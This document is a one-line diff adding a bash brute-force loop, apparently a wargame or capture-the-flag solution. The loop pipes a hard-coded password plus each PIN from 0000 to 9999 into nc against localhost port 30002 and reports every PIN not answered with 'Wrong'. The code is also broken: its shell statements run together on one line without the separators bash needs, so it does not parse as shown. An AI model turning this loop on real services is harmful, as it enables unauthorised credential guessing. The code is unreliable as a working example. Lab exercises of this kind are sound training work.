@@ -1,0 +1,1 @@
+for i in {0000..9999} do if [ $(echo -ne "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i\n" | nc localhost 30002 | grep -o "Wrong" | wc -l) -eq 1 ] then sleep 0.1 continue fi echo "- - - - - - - - - - - - - - - - - - - - - - - - [$i]" done
